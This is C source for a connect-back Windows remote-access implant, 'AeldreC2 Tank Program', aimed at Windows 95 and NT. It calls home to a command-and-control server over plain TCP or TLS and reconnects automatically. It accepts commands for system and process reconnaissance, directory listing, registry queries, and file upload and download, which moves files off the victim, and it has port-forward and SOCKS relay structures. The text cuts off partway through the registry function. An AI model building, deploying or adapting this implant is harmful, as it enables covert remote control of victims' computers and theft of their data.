/*
 * tank.c  --  AeldreC2 Tank Program v1
 *
 * Connect-back Win32 implant.  Calls home to Joshua, receives commands,
 * executes them, streams output back.  Reconnects automatically.
 *
 * Targets: Windows 95, NT 3.1 / 3.5 / 3.51 / NT 4
 *          Win32s: connects + banner; shell exec not reliable.
 *
 * Build:
 *   wcl386 -za99 -bt=nt tank.c recognizer.obj wsock32.lib
 *
 * CLU patches the g_clu_block struct by scanning for the magic string.
 * Compile-time defaults: -DTANK_C2_HOST="x.x.x.x" -DTANK_C2_PORT=nnn
 *
 * Protocol (line-oriented):
 *   operator -> tank:  <command>\n
 *   tank -> operator:  <output> ... <<<DONE>>>\n
 *   get <path>         FILE:<size>\n <raw bytes> <<<DONE>>>\n
 *   put <path>         PUTREADY\n  wait PUTSIZE:<n>\n  <n bytes>  <<<DONE>>>\n
 *   screenshot         FILE:<size>\n <bmp bytes> <<<DONE>>>\n
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* MSG_WAITALL is Winsock 2 — define for Winsock 1.1 builds */
#ifndef MSG_WAITALL
#  define MSG_WAITALL 0x8
#endif

/* -----------------------------------------------------------------------
 * Build-time defaults — CLU overrides via the patchable block below.
 * ----------------------------------------------------------------------- */
/* Stringify helpers so TANK_C2_HOST can be passed without shell quoting:
 *   -DTANK_C2_HOST=10.0.2.15   (no quotes needed on command line) */
#define TANK_STR_(x)    #x
#define TANK_STR(x)     TANK_STR_(x)

#ifndef TANK_C2_HOST
#  define TANK_C2_HOST  127.0.0.1   /* override: -DTANK_C2_HOST=x.x.x.x */
#endif
#ifndef TANK_C2_PORT
#  define TANK_C2_PORT  4444
#endif
#ifndef TANK_RETRY_MS
#  define TANK_RETRY_MS 30000
#endif

/* -----------------------------------------------------------------------
 * CLU patchable configuration block.
 * CLU scans the binary for "AELDRECLU0001", then overwrites:
 *   offset 14: host  (64 bytes, null-padded)
 *   offset 78: port  (2 bytes, little-endian WORD)
 *   offset 80: tls   (1 byte,  0 = plain, 1 = TLS)
 * ----------------------------------------------------------------------- */
#pragma pack(1)
static struct {
    char  magic[14];
    char  host[64];
    WORD  port;
    BYTE  tls;
} g_clu = {
    "AELDRECLU0001",
    TANK_STR(TANK_C2_HOST),  /* char[64]: C zero-fills remainder */
    TANK_C2_PORT,
    0
};
#pragma pack()

/* -----------------------------------------------------------------------
 * Tunables
 * ----------------------------------------------------------------------- */
#define CMD_BUFSZ   4096
#define OUT_BUFSZ   32768
#define TLS_BUFSZ   (32*1024)
#define DONE_STR    "<<<DONE>>>\n"
#define DONE_LEN    11

#ifndef CREATE_NO_WINDOW
#  define CREATE_NO_WINDOW 0x08000000UL
#endif

/* -----------------------------------------------------------------------
 * Schannel / SSPI types (inline — no security.h required)
 * ----------------------------------------------------------------------- */
typedef LONG SECURITY_STATUS;
typedef struct { ULONG_PTR dwLower; ULONG_PTR dwUpper; } NC_SecHandle;
typedef NC_SecHandle CredHandle;
typedef NC_SecHandle CtxtHandle;
typedef struct { DWORD LowPart; LONG HighPart; } NC_TimeStamp;
typedef struct { ULONG cbBuffer; ULONG BufferType; PVOID pvBuffer; } SecBuffer;
typedef struct { ULONG ulVersion; ULONG cBuffers; SecBuffer *pBuffers; } SecBufferDesc;
typedef struct {
    ULONG cbHeader; ULONG cbTrailer; ULONG cbMaximumMessage;
    ULONG cBuffers; ULONG cbBlockSize;
} SecPkgContext_StreamSizes;
typedef struct {
    DWORD dwVersion; DWORD cCreds; void **paCred; HANDLE hRootStore;
    DWORD cMappers; void **aphMappers; DWORD cSupportedAlgs; DWORD *palgSupportedAlgs;
    DWORD grbitEnabledProtocols; DWORD dwMinimumCipherStrength;
    DWORD dwMaximumCipherStrength; DWORD dwSessionLifespan;
    DWORD dwFlags; DWORD dwCredFormat;
} NC_SchannelCred;

#define NC_SECBUF_VERSION           0
#define NC_SECBUFFER_EMPTY          0
#define NC_SECBUFFER_DATA           1
#define NC_SECBUFFER_TOKEN          2
#define NC_SECBUFFER_EXTRA          5
#define NC_SECBUFFER_STREAM_TRAILER 6
#define NC_SECBUFFER_STREAM_HEADER  7
#define NC_SEC_E_OK                 ((SECURITY_STATUS)0x00000000L)
#define NC_SEC_I_CONTINUE_NEEDED    ((SECURITY_STATUS)0x00090312L)
#define NC_SEC_E_INCOMPLETE_MESSAGE ((SECURITY_STATUS)0x80090318L)
#define NC_SECPKG_ATTR_STREAM_SIZES 4
#define NC_SECPKG_CRED_OUTBOUND     2
#define NC_SCHANNEL_CRED_VERSION    4
#define NC_SP_PROT_TLS1_2_CLIENT    0x00000200
#define NC_SP_PROT_TLS1_3_CLIENT    0x00002000
#define NC_SCH_CRED_NO_DEFAULT_CREDS       0x00000010
#define NC_SCH_CRED_MANUAL_CRED_VALIDATION 0x00000008
#define NC_ISC_REQ_REPLAY_DETECT    0x00000004
#define NC_ISC_REQ_SEQUENCE_DETECT  0x00000008
#define NC_ISC_REQ_CONFIDENTIALITY  0x00000010
#define NC_ISC_REQ_ALLOCATE_MEMORY  0x00000100
#define NC_ISC_REQ_STREAM           0x00008000
#define NC_ISC_REQ_MANUAL_CRED_VAL  0x00080000
#define NC_UNISP_NAME "Microsoft Unified Security Protocol Provider"

typedef SECURITY_STATUS (WINAPI *pfAcqCred)(char*,char*,ULONG,void*,void*,void*,void*,CredHandle*,NC_TimeStamp*);
typedef SECURITY_STATUS (WINAPI *pfInitSecCtx)(CredHandle*,CtxtHandle*,char*,ULONG,ULONG,ULONG,SecBufferDesc*,ULONG,CtxtHandle*,SecBufferDesc*,PULONG,NC_TimeStamp*);
typedef SECURITY_STATUS (WINAPI *pfFreeCredH)(CredHandle*);
typedef SECURITY_STATUS (WINAPI *pfDelSecCtx)(CtxtHandle*);
typedef SECURITY_STATUS (WINAPI *pfEncMsg)(CtxtHandle*,ULONG,SecBufferDesc*,ULONG);
typedef SECURITY_STATUS (WINAPI *pfDecMsg)(CtxtHandle*,SecBufferDesc*,ULONG,PULONG);
typedef SECURITY_STATUS (WINAPI *pfFreeCtxBuf)(void*);
typedef SECURITY_STATUS (WINAPI *pfQryCtxAttr)(CtxtHandle*,ULONG,void*);

static HMODULE      t_secur32    = NULL;
static pfAcqCred    t_AcqCred    = NULL;
static pfInitSecCtx t_InitSecCtx = NULL;
static pfFreeCredH  t_FreeCred   = NULL;
static pfDelSecCtx  t_DelSecCtx  = NULL;
static pfEncMsg     t_EncMsg     = NULL;
static pfDecMsg     t_DecMsg     = NULL;
static pfFreeCtxBuf t_FreeCtxBuf = NULL;
static pfQryCtxAttr t_QryCtxAttr = NULL;
static int          t_tls_avail  = 0;
static int          t_tls_on     = 0;
static CredHandle   t_cred;
static CtxtHandle   t_ctx;
static int          t_cred_valid = 0;
static int          t_ctx_valid  = 0;
static SecPkgContext_StreamSizes t_sizes;

/* Encrypted receive buffer (raw from network) */
static char  t_enc_buf[TLS_BUFSZ];
static int   t_enc_len = 0;
/* Decrypted plaintext ready to consume */
static char  t_dec_buf[TLS_BUFSZ];
static int   t_dec_r   = 0;
static int   t_dec_len = 0;

/* -----------------------------------------------------------------------
 * Portfwd / SOCKS4 relay structures
 * ----------------------------------------------------------------------- */
#define MAX_RELAYS  8

typedef struct {
    HANDLE thread;
    int    active;
    int    type;          /* 1=portfwd, 2=socks4 */
    int    lport;
    char   rhost[256];
    int    rport;
    SOCKET listen_sock;
    SOCKET c2_sock;       /* back-channel to report new connections */
} RelaySlot;

static RelaySlot g_relays[MAX_RELAYS];

/* -----------------------------------------------------------------------
 * ToolHelp32 types (inline)
 * ----------------------------------------------------------------------- */
#define TC_TH32CS_SNAPPROCESS 0x00000002UL
typedef struct {
    DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID;
    DWORD th32DefaultHeapID; DWORD th32ModuleID; DWORD cntThreads;
    DWORD th32ParentProcessID; LONG pcPriClassBase; DWORD dwFlags;
    char  szExeFile[MAX_PATH];
} TC_PE32;
typedef HANDLE (WINAPI *PFN_CTS)(DWORD,DWORD);
typedef BOOL   (WINAPI *PFN_P32F)(HANDLE,TC_PE32*);
typedef BOOL   (WINAPI *PFN_P32N)(HANDLE,TC_PE32*);

/* -----------------------------------------------------------------------
 * IP Helper API types (inline, loaded at runtime from iphlpapi.dll)
 * Available on NT 4+ / Win98+; functions return ERROR_NOT_SUPPORTED or
 * LoadLibrary fails on NT 3.x — callers check for NULL before use.
 * ----------------------------------------------------------------------- */
#define IPHLP_MAX_ADAPTER_NAME 260
#define IPHLP_MAX_ADAPTER_DESC 132
#define IPHLP_MAX_ADAPTER_ADDR   8

typedef struct _IPHLP_IP_ADDR_STR {
    struct _IPHLP_IP_ADDR_STR *Next;
    char IpAddress[16];
    char IpMask[16];
    DWORD Context;
} IPHLP_IP_ADDR_STR;

typedef struct _IPHLP_ADAPTER_INFO {
    struct _IPHLP_ADAPTER_INFO *Next;
    DWORD  ComboIndex;
    char   AdapterName[IPHLP_MAX_ADAPTER_NAME];
    char   Description[IPHLP_MAX_ADAPTER_DESC];
    UINT   AddressLength;
    BYTE   Address[IPHLP_MAX_ADAPTER_ADDR];
    DWORD  Index;
    UINT   Type;
    UINT   DhcpEnabled;
    IPHLP_IP_ADDR_STR *CurrentIpAddress;
    IPHLP_IP_ADDR_STR  IpAddressList;
    IPHLP_IP_ADDR_STR  GatewayList;
    IPHLP_IP_ADDR_STR  DhcpServer;
    BOOL               HaveWins;
    IPHLP_IP_ADDR_STR  PrimaryWinsServer;
    IPHLP_IP_ADDR_STR  SecondaryWinsServer;
    DWORD              LeaseObtained;
    DWORD              LeaseExpires;
} IPHLP_ADAPTER_INFO;
typedef DWORD (WINAPI *pfGetAdaptersInfo)(IPHLP_ADAPTER_INFO *, PULONG);

typedef struct { DWORD dwState,dwLocalAddr,dwLocalPort,dwRemoteAddr,dwRemotePort; } IPHLP_TCPROW;
typedef struct { DWORD dwNumEntries; IPHLP_TCPROW  table[1]; } IPHLP_TCPTABLE;
typedef DWORD (WINAPI *pfGetTcpTable)(PVOID, PDWORD, BOOL);

typedef struct { DWORD dwLocalAddr, dwLocalPort; } IPHLP_UDPROW;
typedef struct { DWORD dwNumEntries; IPHLP_UDPROW  table[1]; } IPHLP_UDPTABLE;
typedef DWORD (WINAPI *pfGetUdpTable)(PVOID, PDWORD, BOOL);

typedef struct {
    DWORD dwForwardDest,dwForwardMask,dwForwardPolicy,dwForwardNextHop;
    DWORD dwForwardIfIndex,dwForwardType,dwForwardProto,dwForwardAge;
    DWORD dwForwardNextHopAS;
    DWORD dwForwardMetric1,dwForwardMetric2,dwForwardMetric3,dwForwardMetric4,dwForwardMetric5;
} IPHLP_IPFWDROW;
typedef struct { DWORD dwNumEntries; IPHLP_IPFWDROW table[1]; } IPHLP_IPFWDTABLE;
typedef DWORD (WINAPI *pfGetIpForwardTable)(PVOID, PDWORD, BOOL);

/* -----------------------------------------------------------------------
 * External: Recognizer module (recognizer.c)
 * ----------------------------------------------------------------------- */
extern int recognizer_check(void);

/* -----------------------------------------------------------------------
 * TLS: load secur32.dll
 * ----------------------------------------------------------------------- */
static void tls_load(void)
{
    t_secur32 = LoadLibrary("secur32.dll");
    if (!t_secur32) return;
#define GF(v,n) v=(void*)GetProcAddress(t_secur32,n); if(!v){FreeLibrary(t_secur32);t_secur32=NULL;return;}
    GF(t_AcqCred,    "AcquireCredentialsHandleA")
    GF(t_InitSecCtx, "InitializeSecurityContextA")
    GF(t_FreeCred,   "FreeCredentialsHandle")
    GF(t_DelSecCtx,  "DeleteSecurityContext")
    GF(t_EncMsg,     "EncryptMessage")
    GF(t_DecMsg,     "DecryptMessage")
    GF(t_FreeCtxBuf, "FreeContextBuffer")
    GF(t_QryCtxAttr, "QueryContextAttributesA")
#undef GF
    t_tls_avail = 1;
}

/* -----------------------------------------------------------------------
 * TLS: blocking handshake after TCP connect
 * ----------------------------------------------------------------------- */
static int tls_handshake(SOCKET s)
{
    NC_SchannelCred cred;
    NC_TimeStamp    ts;
    ULONG           attrs;
    SecBuffer       out_buf;
    SecBufferDesc   out_desc;
    SECURITY_STATUS ss;

    if (!t_tls_avail) return 0;

    memset(&cred, 0, sizeof(cred));
    cred.dwVersion             = NC_SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = NC_SP_PROT_TLS1_2_CLIENT | NC_SP_PROT_TLS1_3_CLIENT;
    cred.dwFlags               = NC_SCH_CRED_NO_DEFAULT_CREDS | NC_SCH_CRED_MANUAL_CRED_VALIDATION;

    ss = t_AcqCred(NULL, NC_UNISP_NAME, NC_SECPKG_CRED_OUTBOUND,
                   NULL, &cred, NULL, NULL, &t_cred, &ts);
    if (ss != NC_SEC_E_OK) return 0;
    t_cred_valid = 1;

    attrs = NC_ISC_REQ_REPLAY_DETECT | NC_ISC_REQ_SEQUENCE_DETECT |
            NC_ISC_REQ_CONFIDENTIALITY | NC_ISC_REQ_ALLOCATE_MEMORY |
            NC_ISC_REQ_STREAM | NC_ISC_REQ_MANUAL_CRED_VAL;

    out_buf.cbBuffer = 0; out_buf.BufferType = NC_SECBUFFER_TOKEN; out_buf.pvBuffer = NULL;
    out_desc.ulVersion = NC_SECBUF_VERSION; out_desc.cBuffers = 1; out_desc.pBuffers = &out_buf;

    ss = t_InitSecCtx(&t_cred, NULL, g_clu.host, attrs, 0, 0, NULL, 0,
                      &t_ctx, &out_desc, &attrs, &ts);
    t_ctx_valid = 1;

    if (out_buf.pvBuffer && out_buf.cbBuffer > 0) {
        send(s, (char *)out_buf.pvBuffer, (int)out_buf.cbBuffer, 0);
        t_FreeCtxBuf(out_buf.pvBuffer);
    }

    while (ss == NC_SEC_I_CONTINUE_NEEDED || ss == NC_SEC_E_INCOMPLETE_MESSAGE) {
        SecBuffer in_bufs[2];
        SecBufferDesc in_desc;
        int n, i, orig_len;

        n = recv(s, t_enc_buf + t_enc_len,
                 (int)(sizeof(t_enc_buf) - t_enc_len), 0);
        if (n <= 0) return 0;
        t_enc_len += n;

        in_bufs[0].cbBuffer   = (ULONG)t_enc_len;
        in_bufs[0].BufferType = NC_SECBUFFER_TOKEN;
        in_bufs[0].pvBuffer   = t_enc_buf;
        in_bufs[1].cbBuffer   = 0;
        in_bufs[1].BufferType = NC_SECBUFFER_EMPTY;
        in_bufs[1].pvBuffer   = NULL;
        in_desc.ulVersion = NC_SECBUF_VERSION;
        in_desc.cBuffers  = 2;
        in_desc.pBuffers  = in_bufs;

        out_buf.cbBuffer = 0; out_buf.BufferType = NC_SECBUFFER_TOKEN; out_buf.pvBuffer = NULL;
        out_desc.ulVersion = NC_SECBUF_VERSION; out_desc.cBuffers = 1; out_desc.pBuffers = &out_buf;

        orig_len = t_enc_len;
        ss = t_InitSecCtx(&t_cred, &t_ctx, g_clu.host, attrs, 0, 0, &in_desc, 0,
                          &t_ctx, &out_desc, &attrs, &ts);

        if (out_buf.pvBuffer && out_buf.cbBuffer > 0) {
            send(s, (char *)out_buf.pvBuffer, (int)out_buf.cbBuffer, 0);
            t_FreeCtxBuf(out_buf.pvBuffer);
        }

        t_enc_len = 0;
        for (i = 0; i < 2; i++) {
            if (in_bufs[i].BufferType == NC_SECBUFFER_EXTRA && in_bufs[i].cbBuffer > 0) {
                int extra = (int)in_bufs[i].cbBuffer;
                memmove(t_enc_buf, t_enc_buf + (orig_len - extra), extra);
                t_enc_len = extra;
                break;
            }
        }
    }

    if (ss != NC_SEC_E_OK) return 0;
    t_QryCtxAttr(&t_ctx, NC_SECPKG_ATTR_STREAM_SIZES, &t_sizes);
    t_tls_on = 1;
    return 1;
}

static void tls_teardown(void)
{
    if (t_ctx_valid)  { t_DelSecCtx(&t_ctx);  t_ctx_valid  = 0; }
    if (t_cred_valid) { t_FreeCred(&t_cred);  t_cred_valid = 0; }
    t_tls_on  = 0;
    t_enc_len = 0;
    t_dec_r   = 0;
    t_dec_len = 0;
}

/* -----------------------------------------------------------------------
 * TLS: receive one plaintext byte (blocking, feeds DecryptMessage)
 * ----------------------------------------------------------------------- */
static int tls_recv_byte(SOCKET s, char *out)
{
    int i;

    if (t_dec_r < t_dec_len) {
        *out = t_dec_buf[t_dec_r++];
        return 1;
    }
    t_dec_r = t_dec_len = 0;

    /* Need more data */
    {
        int n = recv(s, t_enc_buf + t_enc_len,
                     (int)(sizeof(t_enc_buf) - t_enc_len), 0);
        if (n <= 0) return n;
        t_enc_len += n;
    }

    {
        SecBuffer bufs[4]; SecBufferDesc desc; ULONG qop = 0;
        SECURITY_STATUS ss;

        bufs[0].cbBuffer   = (ULONG)t_enc_len;
        bufs[0].BufferType = NC_SECBUFFER_DATA;
        bufs[0].pvBuffer   = t_enc_buf;
        bufs[1].cbBuffer = 0; bufs[1].BufferType = NC_SECBUFFER_EMPTY; bufs[1].pvBuffer = NULL;
        bufs[2].cbBuffer = 0; bufs[2].BufferType = NC_SECBUFFER_EMPTY; bufs[2].pvBuffer = NULL;
        bufs[3].cbBuffer = 0; bufs[3].BufferType = NC_SECBUFFER_EMPTY; bufs[3].pvBuffer = NULL;
        desc.ulVersion = NC_SECBUF_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;

        ss = t_DecMsg(&t_ctx, &desc, 0, &qop);

        if (ss == NC_SEC_E_INCOMPLETE_MESSAGE) {
            /* Need even more encrypted data before we can decrypt */
            return tls_recv_byte(s, out);
        }
        if (ss != NC_SEC_E_OK) return -1;

        for (i = 0; i < 4; i++) {
            if (bufs[i].BufferType == NC_SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
                int len = (int)bufs[i].cbBuffer;
                if (len > (int)sizeof(t_dec_buf)) len = (int)sizeof(t_dec_buf);
                memcpy(t_dec_buf, bufs[i].pvBuffer, len);
                t_dec_len = len;
                t_dec_r   = 0;
                break;
            }
        }

        t_enc_len = 0;
        for (i = 0; i < 4; i++) {
            if (bufs[i].BufferType == NC_SECBUFFER_EXTRA && bufs[i].cbBuffer > 0) {
                int extra = (int)bufs[i].cbBuffer;
                memmove(t_enc_buf, bufs[i].pvBuffer, extra);
                t_enc_len = extra;
                break;
            }
        }
    }

    if (t_dec_len > 0) {
        *out = t_dec_buf[t_dec_r++];
        return 1;
    }
    return tls_recv_byte(s, out);  /* renegotiation / empty record */
}

/* -----------------------------------------------------------------------
 * TLS: send all bytes
 * ----------------------------------------------------------------------- */
static int tls_send_all(SOCKET s, const char *buf, int len)
{
    int sent = 0;
    while (sent < len) {
        char *tbuf;
        int   chunk = len - sent;
        int   total;
        SecBuffer bufs[4]; SecBufferDesc desc; SECURITY_STATUS ss;

        if (chunk > (int)t_sizes.cbMaximumMessage)
            chunk = (int)t_sizes.cbMaximumMessage;

        total = (int)(t_sizes.cbHeader + (ULONG)chunk + t_sizes.cbTrailer);
        tbuf  = (char *)GlobalAlloc(GMEM_FIXED, total);
        if (!tbuf) return -1;

        memcpy(tbuf + t_sizes.cbHeader, buf + sent, chunk);
        bufs[0].cbBuffer = t_sizes.cbHeader;  bufs[0].BufferType = NC_SECBUFFER_STREAM_HEADER;  bufs[0].pvBuffer = tbuf;
        bufs[1].cbBuffer = (ULONG)chunk;      bufs[1].BufferType = NC_SECBUFFER_DATA;            bufs[1].pvBuffer = tbuf + t_sizes.cbHeader;
        bufs[2].cbBuffer = t_sizes.cbTrailer; bufs[2].BufferType = NC_SECBUFFER_STREAM_TRAILER; bufs[2].pvBuffer = tbuf + t_sizes.cbHeader + chunk;
        bufs[3].cbBuffer = 0;                 bufs[3].BufferType = NC_SECBUFFER_EMPTY;          bufs[3].pvBuffer = NULL;
        desc.ulVersion = NC_SECBUF_VERSION; desc.cBuffers = 4; desc.pBuffers = bufs;

        ss = t_EncMsg(&t_ctx, 0, &desc, 0);
        if (ss == NC_SEC_E_OK) send(s, tbuf, total, 0);
        GlobalFree(tbuf);
        if (ss != NC_SEC_E_OK) return -1;
        sent += chunk;
    }
    return 0;
}

/* -----------------------------------------------------------------------
 * Helpers
 * ----------------------------------------------------------------------- */
static int send_all(SOCKET s, const char *buf, int len)
{
    if (t_tls_on) return tls_send_all(s, buf, len);
    {
        int sent = 0;
        while (sent < len) {
            int n = send(s, buf + sent, len - sent, 0);
            if (n == SOCKET_ERROR) return -1;
            sent += n;
        }
    }
    return 0;
}

static int send_str(SOCKET s, const char *str) { return send_all(s, str, lstrlen(str)); }
static int send_done(SOCKET s)                  { return send_all(s, DONE_STR, DONE_LEN); }

static int recv_one(SOCKET s, char *c)
{
    if (t_tls_on) return tls_recv_byte(s, c);
    return recv(s, c, 1, 0);
}

static int recv_line(SOCKET s, char *buf, int bufsz)
{
    int  pos = 0;
    char c;
    int  n;
    while (pos < bufsz - 1) {
        n = recv_one(s, &c);
        if (n <= 0) return n;
        if (c == '\r') continue;
        if (c == '\n') { buf[pos] = '\0'; return pos; }
        buf[pos++] = c;
    }
    buf[pos] = '\0';
    return pos;
}

/* Read exactly len bytes (blocking), TLS-aware */
static int recv_exact(SOCKET s, char *buf, DWORD len)
{
    DWORD got = 0;
    while (got < len) {
        if (t_tls_on) {
            char c;
            int r = tls_recv_byte(s, &c);
            if (r <= 0) return (int)r;
            buf[got++] = c;
        } else {
            int r = recv(s, buf + got, (int)(len - got), 0);
            if (r <= 0) return r;
            got += (DWORD)r;
        }
    }
    return (int)got;
}

static int nc_nicmp(const char *a, const char *b, int n)
{
    int i;
    for (i = 0; i < n; i++) {
        char ca = (a[i]>='A'&&a[i]<='Z')?(char)(a[i]+32):a[i];
        char cb = (b[i]>='A'&&b[i]<='Z')?(char)(b[i]+32):b[i];
        if (ca != cb) return (int)(unsigned char)ca-(int)(unsigned char)cb;
        if (!a[i]) return 0;
    }
    return 0;
}

static int cmd_is(const char *cmd, const char *verb)
{
    int vl = lstrlen(verb);
    return nc_nicmp(cmd, verb, vl) == 0 && (cmd[vl]=='\0'||cmd[vl]==' ');
}

static const char *cmd_arg(const char *cmd, const char *verb)
{
    int vl = lstrlen(verb);
    return (cmd[vl]==' ') ? cmd+vl+1 : cmd+vl;
}

static void find_shell(char *out, int bufsz)
{
    char dir[MAX_PATH], path[MAX_PATH];
    GetSystemDirectory(dir, MAX_PATH);
    wsprintf(path, "%s\\cmd.exe", dir);
    if (GetFileAttributes(path) != 0xFFFFFFFF) { lstrcpyn(out, path, bufsz); return; }
    GetWindowsDirectory(dir, MAX_PATH);
    wsprintf(path, "%s\\COMMAND.COM", dir);
    lstrcpyn(out, path, bufsz);
}

/* -----------------------------------------------------------------------
 * Native commands
 * ----------------------------------------------------------------------- */
static int cmd_sysinfo(SOCKET s)
{
    char          buf[1024];
    char          compname[MAX_PATH], username[MAX_PATH];
    DWORD         namesz;
    OSVERSIONINFO osv;
    MEMORYSTATUS  ms;
    DWORD         drives;
    int           i;

    namesz = MAX_PATH; compname[0] = '\0'; GetComputerName(compname, &namesz);
    namesz = MAX_PATH; username[0] = '\0'; GetUserName(username, &namesz);
    memset(&osv, 0, sizeof(osv)); osv.dwOSVersionInfoSize = sizeof(osv); GetVersionEx(&osv);
    ms.dwLength = sizeof(ms); GlobalMemoryStatus(&ms);

    wsprintf(buf,
        "Host:   %s\r\nUser:   %s\r\n"
        "OS:     %lu.%lu (build %lu) %s\r\n"
        "RAM:    %lu MB total  %lu MB free\r\n",
        compname[0] ? compname : "unknown",
        username[0] ? username : "unknown",
        osv.dwMajorVersion, osv.dwMinorVersion, osv.dwBuildNumber,
        osv.szCSDVersion,
        ms.dwTotalPhys >> 20, ms.dwAvailPhys >> 20);
    send_str(s, buf);

    drives = GetLogicalDrives();
    send_str(s, "Drives: ");
    for (i = 0; i < 26; i++) {
        if (drives & (1UL << i)) {
            char root[4]; UINT dt; char ts[12];
            wsprintf(root, "%c:\\", 'A'+i);
            dt = GetDriveType(root);
            switch (dt) {
            case DRIVE_REMOVABLE: lstrcpy(ts,"removable"); break;
            case DRIVE_FIXED:     lstrcpy(ts,"fixed");     break;
            case DRIVE_REMOTE:    lstrcpy(ts,"remote");    break;
            case DRIVE_CDROM:     lstrcpy(ts,"cdrom");     break;
            case DRIVE_RAMDISK:   lstrcpy(ts,"ramdisk");   break;
            default:              lstrcpy(ts,"?");          break;
            }
            wsprintf(buf, "%s(%s) ", root, ts);
            send_str(s, buf);
        }
    }
    send_str(s, "\r\n");
    return send_done(s);
}

static int cmd_ps(SOCKET s)
{
    HMODULE  hK = GetModuleHandle("kernel32.dll");
    PFN_CTS  fCTS  = hK ? (PFN_CTS) GetProcAddress(hK,"CreateToolhelp32Snapshot") : NULL;
    PFN_P32F fP32F = hK ? (PFN_P32F)GetProcAddress(hK,"Process32First") : NULL;
    PFN_P32N fP32N = hK ? (PFN_P32N)GetProcAddress(hK,"Process32Next")  : NULL;
    HANDLE   snap;
    TC_PE32  pe;
    char     line[MAX_PATH+64];

    if (!fCTS||!fP32F||!fP32N) {
        send_str(s,"ps: ToolHelp32 not available (NT<4 / Win32s)\r\n");
        return send_done(s);
    }
    snap = fCTS(TC_TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) { send_str(s,"ps: snapshot failed\r\n"); return send_done(s); }
    send_str(s,"  PID  Thds  Parent  Name\r\n");
    send_str(s,"-----  ----  ------  ----\r\n");
    pe.dwSize = sizeof(pe);
    if (fP32F(snap,&pe)) do {
        wsprintf(line,"%5lu  %4lu  %6lu  %s\r\n",
                 pe.th32ProcessID,pe.cntThreads,pe.th32ParentProcessID,pe.szExeFile);
        send_str(s,line);
    } while (fP32N(snap,&pe));
    CloseHandle(snap);
    return send_done(s);
}

static int cmd_ls(SOCKET s, const char *path)
{
    WIN32_FIND_DATA wfd;
    HANDLE hFind;
    char   pattern[MAX_PATH], line[MAX_PATH+32];

    if (!path||!path[0]) {
        GetCurrentDirectory(MAX_PATH,pattern); lstrcat(pattern,"\\*");
    } else {
        lstrcpyn(pattern,path,MAX_PATH-3);
        { int l=lstrlen(pattern);
          if(l>0&&pattern[l-1]!='\\'&&pattern[l-1]!='*') lstrcat(pattern,"\\*"); }
    }
    hFind = FindFirstFile(pattern,&wfd);
    if (hFind==INVALID_HANDLE_VALUE) {
        wsprintf(line,"ls: cannot open '%s'\r\n",pattern);
        send_str(s,line); return send_done(s);
    }
    do {
        BOOL d = (wfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)!=0;
        if (d) wsprintf(line,"     <DIR>        %s\r\n",wfd.cFileName);
        else   wsprintf(line,"%12lu  %s\r\n",wfd.nFileSizeLow,wfd.cFileName);
        send_str(s,line);
    } while (FindNextFile(hFind,&wfd));
    FindClose(hFind);
    return send_done(s);
}

static int cmd_get(SOCKET s, const char *path)
{
    HANDLE hFile; DWORD fsize, nread; char header[64]; char *buf; int rc=0;
    if (!path||!path[0]) { send_str(s,"get: no path\r\n"); return send_done(s); }
    hFile = CreateFile(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if (hFile==INVALID_HANDLE_VALUE) {
        char m[MAX_PATH+40]; wsprintf(m,"get: cannot open '%s' (%lu)\r\n",path,GetLastError());
        send_str(s,m); return send_done(s);
    }
    fsize = GetFileSize(hFile,NULL);
    wsprintf(header,"FILE:%lu\n",fsize);
    send_str(s,header);
    buf = (char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
    if (!buf) { CloseHandle(hFile); send_str(s,"get: oom\r\n"); return send_done(s); }
    while (ReadFile(hFile,buf,OUT_BUFSZ,&nread,NULL)&&nread>0)
        if (send_all(s,buf,(int)nread)<0) { rc=-1; break; }
    CloseHandle(hFile); GlobalFree(buf);
    if (rc==0) rc=send_done(s);
    return rc;
}

static int cmd_put(SOCKET s, const char *path)
{
    char  line[64];
    DWORD expected, total;
    HANDLE hFile;
    char  *buf;
    int    n;

    if (!path||!path[0]) { send_str(s,"put: no path\r\n"); return send_done(s); }
    send_str(s,"PUTREADY\n");

    n = recv_line(s,line,sizeof(line));
    if (n<=0) return n;
    if (nc_nicmp(line,"PUTSIZE:",8)!=0) { send_str(s,"put: protocol error\r\n"); return send_done(s); }
    expected = (DWORD)atol(line+8);

    hFile = CreateFile(path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
    if (hFile==INVALID_HANDLE_VALUE) {
        char m[MAX_PATH+40]; wsprintf(m,"put: cannot create '%s' (%lu)\r\n",path,GetLastError());
        send_str(s,m); return send_done(s);
    }

    buf = (char*)GlobalAlloc(GMEM_FIXED,OUT_BUFSZ);
    if (!buf) { CloseHandle(hFile); send_str(s,"put: oom\r\n"); return send_done(s); }

    total = 0;
    while (total < expected) {
        DWORD want = expected-total;
        DWORD written;
        if (want > OUT_BUFSZ) want = OUT_BUFSZ;
        n = recv_exact(s, buf, want);
        if (n <= 0) { CloseHandle(hFile); GlobalFree(buf); return n; }
        WriteFile(hFile, buf, (DWORD)n, &written, NULL);
        total += (DWORD)n;
    }

    CloseHandle(hFile);
    GlobalFree(buf);
    return send_done(s);
}

static int cmd_regq(SOCKET s, const char *keypath)
{
    HKEY  hive, hkey;
    LONG  ret;
    DWORD idx;
    char  vname[256], line[1536];
    BYTE  vdata[1024];

    struct { const char *n; HKEY h; } hives[] = {
        {"HKLM\\",HKEY_LOCAL_MACHINE},{"HKEY_LOCAL_MACHINE\\",HKEY_LOCAL_MACHINE},
        {"HKCU\\",HKEY_CURRENT_USER}, {"HKEY_CURRENT_USER\\",HKEY_CURRENT_USER},
        {"HKCR\\",HKEY_CLASSES_ROOT}, {"HKEY_CLASSES_ROOT\\",HKEY_CLASSES_ROOT},
        {"HKU\\", HKEY_USERS},        {"HKEY_USERS\\",HKEY_USERS},
        {"HKLM",HKEY_LOCAL_MACHINE},  {"HKCU",HKEY_CURRENT_USER},
    };
